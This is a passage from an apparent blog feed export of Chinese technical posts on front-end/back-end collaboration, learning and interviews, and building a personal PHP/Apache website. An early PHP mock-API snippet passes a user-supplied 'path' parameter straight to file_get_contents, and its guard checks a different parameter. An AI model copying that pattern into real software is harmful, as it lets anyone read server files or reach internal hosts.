class="line">$.ajax(&#123;</span><br><span class="line">  url: <span class="string">&quot;http://&lt;local&gt;/api.php?path=/api/text.json&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></local><p>php中处理就比较简单啦：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">&quot;page&quot;</span>]))&#123;</span><br><span class="line">  echo <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>Ctrl+S,保存把线上的接口数据到本地的api文件夹吧-_-||</li></ul><h3>三、小结</h3><p>本文只是对前后端协作存在的问题和现有的几种常见模式做了简要的列举，JSON Schema 具体如何去运用，还有接口的维护问题、接口信息的获取问题没有具体阐述，这个后续有时间会整理下我对他的理解。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习和面试，这两件事儿</title>
      <link href="/blog/2014/08/01/cb-thinking-between-learning-and-interview/"/>
      <url>/blog/2014/08/01/cb-thinking-between-learning-and-interview/</url>
      
        <content type="html"><![CDATA[<p>上个月（六月份）博客闲置了一月，在学校处理毕业相关事宜。本月仅做了一点建站笔记，几乎没怎么来园子逛。</p><p>许久没写博，突然回到这个熟悉的后台，感觉十分亲切。我喜欢分享自己的喜悦，沉醉于跟大家一起讨论的技术氛围之中，这两年的沉淀也是在大家的切磋和争吵声中偶尔聆听的。大四一年时间里，我分别在百度和阿里两家公司实习了三个月，目前已经正式就职于淘宝UED，忆实习的两段经历，感慨颇多呀~</p><p>近期有好几个朋友问我两个问题：</p><ol><li>想去BAT，怎么去学习呀？</li><li>百度、阿里面试（电面居多）都问些什么问题？</li></ol><p>在我进入两家公司之前，这两个问题也一直困扰着我，当时我心里只有一个念头，<strong>\拼命学吧，到时候比旁边的人优秀一丁点就OK了。"</strong> 事实证明，这个念头也是有效的<img src="file:///C:\Users\HUSTSK~1\AppData\Local\Temp\SGPicFaceTpBq\4404\00C0D942.png" alt="">&nbsp;: )</p><p>这个想法可以扎根在每个人的心里，不过能坚持学习，每天都逼着自己进步的人，少之又少。我当时学的挺辛苦的，各种技术书籍，啃了两百多本，光前端的就有一百多本（<a title="部分书单" href="http://book.douban.com/people/hustskyking/collect">部分书单</a>），像比较经典的书籍会一遍两遍甚至十遍的去读，如《JavaScript权威指南》、《JavaScript设计模式》等，也不知道当时哪来这股子热劲^_^。学校图书馆资源丰富，加上我比较关注书店IT空间的新书，所以大三一年的阅读量是十分惊人的。</p><p>技术学习，并不一定要一个十分明确的方向，就拿前端来说，要成为前端大拿，至少要对设计模式、HTTP协议、后端脚本以及前沿的技术了然于胸，多学一些，前期虽看不到效果，等你沉淀多了，眼界开了，自然就不一样了。前端核心无非就是HTML+CSS+JavaScript，他们的边界很宽。<strong>内涵小的东西，外延往往很宽，前端也是如此。</strong></p><p>现在的面试感觉实的东西并不多，短短半个多小时的闲聊很难了解一个人的真实底蕴（除非你确实很烂），技术性问题就跟公式一样，背一背就知道答案了。公司招人往往喜欢那些口齿伶俐、思路清晰、斩钉截铁的人，我们90后的反应普遍都是比较快的，但是在反应的这一瞬间里，脑子里转了多个弯，分析了多少种情况，面试官都会从问答过程中摸索结果，<strong>所以保持乐观，保持清晰的头脑，保持谦逊的态度，很重要。</strong></p><p><strong>关于学习，底层再底层思考，打破砂锅问到底，这是我的学习方法。</strong></p><p>公司上班之后，可支配的时间少了，不能说学习的时间少了，在公司这个环境中，我们学到更多的不一定是技术，还有人和人之间的交往，也有职场的潜规则。技术学习和技术分享需要持之以恒，希望以后可以做到这点！</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人网站架构设计(三) - 从设计到前端到后台</title>
      <link href="/blog/2014/07/04/cb-personal-website-design-part-3/"/>
      <url>/blog/2014/07/04/cb-personal-website-design-part-3/</url>
      
        <content type="html"><![CDATA[<p>网站地址：<a href="http://barretlee.com">http://barretlee.com</a></p><p>在五月份，写过两篇博客，提到了要给自己做个网站，当时人在实习，没太多的时间，只是把大概的思路捋了一番，顺道也买了个云主机（配置比较低，内存才500M）。接着返校处理毕业事宜，于是六月也随着同学之间挥泪告别的声音渐渐远去。七月，家里呆着，中旬回公司。想必这也是我近几年最长的一次假期了=。 =</p><h3><span>一、先说设计</span></h3><h4>1. 阮一峰的博客</h4><p>目前我的博客设计是 fork 了 BeiYuu 的主题，然后七改八改，除了主页 BeiYuu 还认得出是他的之外，其他页面已经动了很大的手术，而这些手术灵感都是源自阮一峰阮大大（我的博客地址是&lt;barretlee.com&gt;，正文部分基本是抄袭他的设计，虽然代码是我重新敲的...）。</p><p>阮教授自2003年开始经营他的博客ruanyifeng.com，到目前为止已有十一载，期间肯定也是改版了N次。在多次的改版之后，整个网站，结构上，几乎没有太多的冗余，内容上，更不用说，每一篇都是深入浅出、鞭辟入里，绝对可以给32个赞，想表达的内容全部十分清晰地呈现给了读者，阮大大的文字功底，我辈望尘莫及。</p><p>他的博客涉及面广，而且网站的设计上也是花够了心思，在观察他的博客设计时，想到了一些问题。</p><ul><li>读者进入页面，他最关注的是什么？</li><li>通过什么方式来突出文章的重点和亮点？</li><li>网站主页展示哪些元素？</li><li>如何去表述一个比较新的技术点或者观点？</li></ul><p>自己的鄙见我就不发表了，不过上面提到的几个问题都是值得去思考的。</p><h4>2. 张鑫旭的博客</h4><p>张鑫旭大哥，也是通过博客认识的，后来才发现，我与他同是华中科技大学[校友]，再后来又发现，我竟然与他是同一个技术团队（学校&middot;网络应用研发中心）的成员[队友]，再后来还发现，我竟然早就跟他在同一个群里[朋友]。</p><p>很多人提到张鑫旭的博客，都说\就是那个喜欢张含韵的人的博客啦"，我倒是问过他，他说测试图片前几张正好是张含韵，顺手选中拿出来。。他的博客也是十分有特色的：</p><ul><li>专注点很集中 - 前端，而且是小而美的研究，很赞</li><li>文风 - 很能扯淡，喜欢的人竖拇指，不喜欢的人觉得罗里吧嗦</li></ul><p>思考的两个问题：</p><ul><li>如何让别人一眼发现，\哦，这是那个xxx的博客"？</li><li>博客先是记录自己，然后变成服务他人。</li></ul><h4>3. 简书</h4><p>简书的口号就是\找回文字的力量"，我不太喜欢文字（基本没看过小说），所以没有仔细品味简书里面的东西，但却对他网站视觉的设计很感兴趣。简洁大方，有书的味道，整个体验很有质感。</p><p>我是个程序猿，不算射鸡湿。如果文章呈现的内容太多，我会hold不住整体的布局，所以会比较中意简洁的设计，简洁的另一个好处就是突出正文，内容很直观的被呈现出来。</p><p>以上我列举了三个网站，不用想，肯定又会去抄他们了，囧。。。但其实我参考的网站有十几个，把十几个网站（我觉得）突出的地方整合进了自己的设计，请不要喷我这个不懂设计的程序猿。</p><h3>二、从设计到前端实现</h3><p>正常的流程是设计-&gt;设计稿-&gt;切图，我跳过了设计稿，直接开始敲代码，貌似自己对代码的亲切度比PSD图片更高（所以为什么总说撸代码呢...）。</p><p>设计很简单，故意弱化设计以强化内容，希望能够取长补短。</p><h4>1. 正文的设计与实现</h4><p>正文的设计参考了简书，但是简书是一个以文字为中心的网站，图片都很少出现。而对于一个博客来说，有几个元素十分重要：代码、引用块、图片、表格、list列表等等。所以这些元素的展示要自己来设计。</p><p>细节上的东西，只要进入网站就能看到，所以在这里就不赘述太多。代码的高亮使用的是 prettify 的 light 主题，对它做了微调。</p><p><img src="https://images.cnitblog.com/i/387325/201407/041833036684651.jpg" alt=""></p><p>代码块滚动条的样式也修改了下：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">pre::-webkit-scrollbar &#123;<span class="attribute">width</span>:<span class="number">10px</span>;<span class="attribute">height</span>:<span class="number">10px</span>;<span class="attribute">background</span>:<span class="number">#F6F6F6</span>;<span class="attribute">border-top</span>:<span class="number">1px</span> solid <span class="number">#CCC</span>;<span class="attribute">padding-top</span>:<span class="number">1px</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar-thumb &#123;<span class="attribute">background</span>:<span class="number">#EEE</span>;<span class="attribute">border-radius</span>:<span class="number">5px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#CCC</span>;<span class="attribute">border-bottom</span>:<span class="number">0px</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar-thumb:hover &#123;<span class="attribute">background</span>:<span class="number">#DDD</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar &#123;<span class="attribute">width</span>:<span class="number">10px</span>;<span class="attribute">height</span>:<span class="number">10px</span>;<span class="attribute">background</span>:<span class="number">#CCC</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar-thumb &#123;<span class="attribute">background</span>:<span class="number">#999</span>;<span class="attribute">border-radius</span>:<span class="number">5px</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar-thumb:hover &#123;<span class="attribute">background</span>:<span class="number">#666</span>;&#125;</span><br><span class="line">pre::-webkit-scrollbar-corner &#123;<span class="attribute">background</span>:<span class="number">#CCC</span>;&#125;</span><br><span class="line">pre::-webkit-color-swatch &#123;<span class="attribute">border</span>:none;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果是这样的：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041833144027230.jpg" alt=""></p><p>整个设计都是扁平化，没有圆角，看起来感觉还算舒服，下面是引用块的样式呈现：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041833217461008.jpg" alt=""></p><p>由于一些代码是可以直接运行的，所以也给可运行代码加上了一个运行的 button：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041833297309613.jpg" alt=""></p><p>在IE下，是使用一个 about:blank 的空白页打开代码文件，如果浏览器支持 blob 流，将会使用 blob 流打开：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!operation.isIE()) &#123;</span><br><span class="line">    <span class="keyword">window</span>.<span class="keyword">open</span>(URL.createObjectURL(<span class="built_in">new</span> Blob([code], &#123;</span><br><span class="line">        <span class="keyword">type</span>: &quot;text/html; charset=UTF-8&quot;</span><br><span class="line">    &#125;)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    var d = <span class="keyword">window</span>.<span class="keyword">open</span>(&quot;about:blank&quot;).document;</span><br><span class="line">    d.<span class="keyword">write</span>(code);</span><br><span class="line">    d.<span class="keyword">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 侧边栏的设计与实现</h4><p><strong>1) 侧边栏-未展开</strong></p><p><img src="https://images.cnitblog.com/i/387325/201407/041800594809334.jpg" alt=""></p><p>从上图可以看到，侧边栏都是一些功能按钮，从上往下依次是：显示隐藏文章目录，页面主题和字体设置，关于作者，反馈信息，RSS订阅。</p><p><span>为啥要搞个侧边栏，还放那么多的功能按钮？就拿司徒正美的博客来说，我在群里吐槽了他博客风格好几次（被骂回来了...理由是每个人审美观不一样），你可以去瞅瞅他的页面，代码字体实在是太小了，每次看他的博客都会把字号和行高调大一点，后来直接写个脚本放在收藏夹，进入他的网页一键处理。</span></p><p>这个例子说明，每个人的口味不一样。一个网站，倘若冷暖色调，字体大小等可以自定义的话就更棒了，我没做那么复杂，就是给文章加了个黑色主题。</p><p><img src="https://images.cnitblog.com/i/387325/201407/041801196217820.jpg" alt=""></p><p>通过这个按钮可以进行相应的设置。然后是侧边栏下面的几个按钮：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041801255273825.jpg" alt=""></p><p>\跟我对话"点击之后会在右下角往上蹦出一个浮层：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041801309658987.jpg" alt=""></p><p>这个浮层是可拖动的。</p><p><strong>2) 侧边栏-展开</strong></p><p>做了个未展开的侧边栏其实也差不多了，后来发现我的页面中好像并没有\文章归档"，\最新文章"，\最近评论"等这些对一个博客来说很常见的元素，于是乎，抄袭了下豆瓣FM的设计，弄了下面的东西：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041801372622578.jpg" alt=""></p><p>这块效果还挺难做的，主要是滚动不好处理。左侧是一个 fixed 定位，容器的高度是死的，也就是 <code>$(window).height()</code> 的高度，blabla.. 细节我不说了，如果你感兴趣可以去思考下如何实现类似豆瓣FM左侧的功能块。我后来是监听鼠标滚动设置负margi-top值来模拟页面滚动。并且这个监听是在整个 document 而不是仅仅是 左侧的 box 上。</p><p>整体效果实现并不复杂，麻烦的是一些细节处理。</p><h4>2. 底部的设计与实现</h4><p><img src="https://images.cnitblog.com/i/387325/201407/041801445126326.jpg" alt=""></p><p>底部的设计我最纠结的是内容，到底放点什么东西。跟文章相关度最高的，一是相关文章，二是评论，所以也就只把这两样放上了。</p><h3>三、后台设计和数据库</h3><p>开始想过后台用 wordpress 或者其他的框架系统来构建，但是这些东西提供的接口比较冗余，而且功能复杂，没有全盘研究过他们的源码，最后决定自己写一套后端框架以及前后端接口，工作量立马就上去了... 我也是想趁此机会回顾下 php 和 mysql 的知识，太久不用都生疏了。</p><h4>1. 旧博客写入数据库</h4><p>以前的博客都是使用 Markdown 语法写的，Markdown 的优点就是简洁清晰，但是在解析的时候总是会有这样那样的问题，并且很多 Markdown 解析工具都不支持给元素添加 id 或者 class，这让人很纠结。所以存入数据的文章已经解析成 HTML 了。</p><p>Github pages 支持 jekyll 语法，jekyll 允许使用 Markdown，使用 jekyll 语法写的文章内容中多了很多 ``</p><p>对头部的解析也没啥好办法，就是使用正则来匹配：</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span> <span class="operator">=</span> file_get_contents(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$reg</span> <span class="operator">=</span> <span class="string">&quot;/---<span class="subst">\n</span>\s*layout:\s*[\s\S]+?<span class="subst">\n</span>title:\s*(?&lt;title&gt;[\s\S]+?)<span class="subst">\n</span>&quot;</span></span><br><span class="line">  . <span class="string">&quot;description:\s*(?&lt;description&gt;[\s\S]+?)<span class="subst">\n</span>category:\s*&quot;</span></span><br><span class="line">  . <span class="string">&quot;(?&lt;category&gt;[\s\S]+?)<span class="subst">\n</span>(tags:\s*(?&lt;tags&gt;[\s\S]+?)<span class="subst">\n</span>)?---<span class="subst">\n</span>(?&lt;content&gt;[\s\S]+)/&quot;</span>;</span><br><span class="line"></span><br><span class="line">preg_match_all(<span class="variable">$reg</span>, <span class="variable">$html</span>, <span class="variable">$match</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></content></tags></category></description></title></p><p>由于文章并没有集中放在一个文件夹，写了个遍历文件夹的 travel 函数：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> traverse(<span class="variable">$path</span> = <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$current_dir</span> = opendir(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">while</span>((<span class="variable">$file</span> = readdir(<span class="variable">$current_dir</span>)) !== false) &#123;</span><br><span class="line">        <span class="variable">$sub_dir</span> = <span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&#x27;.&#x27;</span> || <span class="variable">$file</span> == <span class="string">&#x27;..&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(is_dir(<span class="variable">$sub_dir</span>)) &#123;</span><br><span class="line">            <span class="regexp">//</span>echo <span class="string">&#x27;Directory &#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;:&lt;br&gt;&#x27;</span>;</span><br><span class="line">            traverse(<span class="variable">$sub_dir</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="regexp">//</span>echo <span class="string">&#x27;File in Directory &#x27;</span> . <span class="variable">$path</span> . <span class="string">&#x27;: &#x27;</span> . <span class="variable">$file</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            dealFile(<span class="variable">$path</span> . DIRECTORY_SEPARATOR . <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，存入数据库之前要处理一些单双引号/UTF-16字符，否则存入的时候会出错。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remSpecialChars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/&#x27;/&quot;</span>,<span class="string">&quot;&lt;#039;&quot;</span>,<span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&quot;/&#x27;</span>,<span class="string">&#x27;&lt;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>取出的时候还原单双引号：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> addSpecialChars(<span class="variable">$string</span>) &#123;</span><br><span class="line">    <span class="regexp">//</span>  <span class="variable">$string</span> = htmlspecialchars(<span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&quot;/&lt;#039;/&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$string</span> = preg_replace(<span class="string">&#x27;/&lt;quot;/&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    return <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 网页各个模块的处理</h4><p>网页中，正文、底部和边栏需要数据，所以数据的查询主要是针对这三块。</p><p><span>目前这三块数据是后台直接同时输出的，稍微想想就知道这个效率并不高，后续肯定会改成异步接口。封装之后，获取并渲染一篇文章就变得异常轻松了：</span></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;page.class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page</span> = <span class="keyword">new</span> <span class="title class_">PageInitor</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正文内容</span></span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$page</span>-&gt;<span class="title function_ invoke__">getPageByTitleEn</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"><span class="comment"># 底部和侧边内容</span></span><br><span class="line"><span class="variable">$otherData</span> = <span class="variable">$page</span>-&gt;<span class="title function_ invoke__">getPostOtherData</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后台数据的渲染都是：</p><p><img src="https://images.cnitblog.com/i/387325/201407/041859003714166.jpg" alt=""></p><p>如果改成前端异步获取，那前端又得写一套模板渲染数据，这里感觉流程上存在冗余，后期肯定会改进。</p><h4>3. 内容的解析</h4><p>文章内容的编写还是使用Markdown，尽管他在某些地方不能满足我的需求。内容的解析使用的是 michelf 的 php-markdown 开源框架：</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cotent</span> = file_get_contents(<span class="variable">$path</span>);</span><br><span class="line"><span class="variable">$html</span> = <span class="title class_">Markdown</span>::defaultTransform(<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用起来也是十分方便，但是上面的函数只能解析一些基础的 Markdown 格式，诸如图片、表格等解析不出来。这需要引入：</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get Markdown class</span></span><br><span class="line"><span class="keyword">use</span> \<span class="title class_">Michelf</span>\<span class="title class_">Markdown</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title class_">Michelf</span>\<span class="title class_">MarkdownExtra</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后使用</span></span><br><span class="line"><span class="title class_">MarkdownExtra</span>::defaultTransform(<span class="variable">$content</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用 MarkdownExtra 的类来解析， MarkdownExtra 是继承 <code>\Michelf\_MarkdownExtra_TmpImpl</code> 的。</p><h3>四、服务器的设置和维护</h3><p>目前使用 apache 作为服务器已经够用了，需要缓存的页面也并不多，就是几个列表页和搜索页，所以这方面可以采用技术成熟的 memcache 来处理，只不过后期在同一台服务器上会搭建多个网站，每个网站对应的域名不一样，并且有些网站的后台会使用 nodeJS 来编写，所以还是需要 Nginx 来配置 Virtual Host，Apache 也可以实现 Vhost 的配置，我在本地测试的时候就是使用的 apache 的 Vhost，这里也简单说说 vhost 的配置。</p><h4>1. apache 的 vhost 配置</h4><p>配置步骤如下：</p><ol><li>在 httpd.conf 中开启 vhost 模块，并 include 其配置文件 httpd-vhosts.conf</li><li>在 httpd-vhosts.conf 写入</li></ol><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这是配置 localhost 这个&quot;域名&quot;</span></span><br><span class="line"><span class="section">&lt;virtualhost *<span class="number">:80</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> i@localhost</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;E:/wamp/www&quot;</span></span><br><span class="line">    <span class="attribute">ServerName</span> localhost</span><br><span class="line">    <span class="attribute">ServerAlias</span> localhost</span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="string">&quot;logs/localhost.log&quot;</span></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="string">&quot;logs/localhost-access.log&quot;</span> common</span><br><span class="line"><span class="section">&lt;/virtualhost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是配置 test.barretlee.com 这个域名</span></span><br><span class="line"><span class="section">&lt;virtualhost *<span class="number">:80</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> test@barretlee.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;E:/wamp/www/barretlee&quot;</span></span><br><span class="line">    <span class="attribute">ServerName</span> test.barretlee.com</span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="string">&quot;logs/test.barretlee.com-error.log&quot;</span></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="string">&quot;logs/test.barretlee.com-access.log&quot;</span> common</span><br><span class="line"><span class="section">&lt;/virtualhost&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为网上对这方面的配置有详细说明，我也不是行家，就不细说了。</p><h4>2. Rewrite模块</h4><p>其实就是网页的静态化，我们看到的php页面是：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/index.php?<span class="built_in">id</span>=23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我们更希望通过这种方式来获取页面：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/index.php/</span><span class="number">23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>URL 需要进行重写，算是内部重定向吧。这方面的工作可以交给 Nginx 来处理，也可以交给 Apache，由于我本地目前还只配置了 Apache，所以先看看 Apache 的配置方式：</p><p><strong>1) 使用了Vhost</strong></p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;virtualhost *<span class="number">:80</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> test@barretlee.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;E:/wamp/www/barretlee&quot;</span></span><br><span class="line">    <span class="attribute">ServerName</span> test.barretlee.com</span><br><span class="line">    <span class="attribute">ErrorLog</span> <span class="string">&quot;logs/test.barretlee.com-error.log&quot;</span></span><br><span class="line">    <span class="attribute">CustomLog</span> <span class="string">&quot;logs/test.barretlee.com-access.log&quot;</span> common</span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;directory e:\wamp\www\barretlee=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">deny</span>,<span class="literal">allow</span></span><br><span class="line">        <span class="attribute">Allow</span> from <span class="literal">all</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">RewriteEngine</span> <span class="literal">on</span></span><br><span class="line">        <span class="attribute">RewriteRule</span> ^blog/(\d+)/(\d+)/(.*).html$ index.php?title=$<span class="number">3</span>&lt;year=$<span class="number">1</span>&lt;month=$<span class="number">2</span></span><br><span class="line">        <span class="attribute">RewriteRule</span> ^static/(.*)$ static/$<span class="number">1</span></span><br><span class="line">    <span class="section">&lt;/directory&gt;</span></span><br><span class="line"><span class="section">&lt;/virtualhost&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果使用了 Vhost，可以在配置里写上 <code>RewriteEngine on</code>，然后加上需要的 RewriteRule 规则就行了。</p><p><strong>2) 没有使用 Vhost</strong></p><p>在网页所在文件的根目录下，新建一个 <code>.htaccess</code> 文件，里头写上：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">on</span></span><br><span class="line"><span class="attribute">RewriteBase</span> /barretlee</span><br><span class="line"><span class="attribute">RewriteRule</span> ^blog/(\d+)/(\d+)/(.*).html$ index.php?title=$<span class="number">3</span>&lt;year=$<span class="number">1</span>&lt;month=$<span class="number">2</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^static/(.*)$ static/$<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重定向的内容就行了。</p><p>第二种方式会存在一个问题，如果你的资源请求在 /barretlee 的上一层或者上几层，那么这里的正则就会匹配不到了，所以建议使用 Vhost 来配置自己的 Apache。</p><h3>五、后期优化和改进</h3><p>上面说了这么多，都是这七天来建站的总结，目前的状态是，博客系统已经搭建完毕，但是没有写博客和管理博客的后台，这又是件头疼的事情，不过还好，后台之后自己看得见，就随意一些。也没有归档页面、分类页等页面，这些页面的设计也是伤脑细胞的。</p><p>整个网站，博客系统只是一个部分，还有其他的问答平台、好文的爬虫抓取、每月期刊、每周好文推送、邮件系统等等，工程量还蛮大，这对我来说也是一个挑战，可以尽情发挥自己的技能，也是个深度学习的好机会！</p><p>页面的加载，首屏时间不能忍受，如果文章篇幅比较大，大约需要1.5到3s才渲染完毕，这个值有点不能忍受。优化方向有：</p><ul><li>PJAX，页面采用 pushState + AJAX，减少请求，不支持 pushState 的页面采用 hash bang 兼容处理。</li><li>bigPipe，如果文章内容比较多，或者其他的模块有所增加，会采用 bigPipe 分拨往前端扔数据。</li><li>前后端统一模板，之前也提到了这个问题，后端渲染的时候使用的后端模板，如果前端要异步加载，则需要重新写一套模板来解析合并数据，这两个模板的相似度是很高的，如果可以复用将减少很多工作量。</li><li>静态数据的缓存问题</li><li>ETag等对页面的标记缓存问题</li></ul><h3>六、小结</h3><p>我最怕的是事情没有一个开始，现在既然已经开始了，我想，离结束也就不远了。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人网站架构设计(二)</title>
      <link href="/blog/2014/05/15/cb-personal-website-design-part-2/"/>
      <url>/blog/2014/05/15/cb-personal-website-design-part-2/</url>
      
        <content type="html"><![CDATA[<p>网站地址：<a href="http://barretlee.com">http://barretlee.com</a></p><p>昨天对网站的架构做了一个简要的分析，有些人不太理解，有了 NodeJS 还要 php 干啥？我推荐了几篇文章给这位童鞋看了：</p><ul><li><a href="http://ued.taobao.org/blog/2014/04/full-stack-development-with-nodejs/" target="_blank">也谈基于NodeJS的全栈式开发（基于NodeJS的前后端分离）</a></li><li><a href="http://ued.taobao.org/blog/2014/04/xtpl/" target="_blank">基于前后端分离的模版探索</a></li><li><a href="http://ued.taobao.org/blog/2014/04/modelproxy/" target="_blank">Midway-ModelProxy &mdash; 轻量级的接口配置建模框架</a></li><li><a href="http://ued.taobao.org/blog/2014/05/midway-security/" target="_blank">前后端分离模式下的安全解决方案</a></li><li><a href="//github.com/lifesinger/lifesinger.github.com/issues/184" target="_blank">Web 研发模式演变</a></li></ul><p>如果是一个很小的网站，是用那么多层来处理请求和响应，确实是冗余的，不过我打算将这个网站设计成一个实时平台，这个平台中包含了很多很多的通信模块，所有后端选用 NodeJS 作为 I/O 处理器，这是可以理解的。php 用于通信，连接消耗大，而且不方便并行处理，效率很低。在网络通信和I/O处理上，NodeJS是很优秀的工具。</p><h3>1. 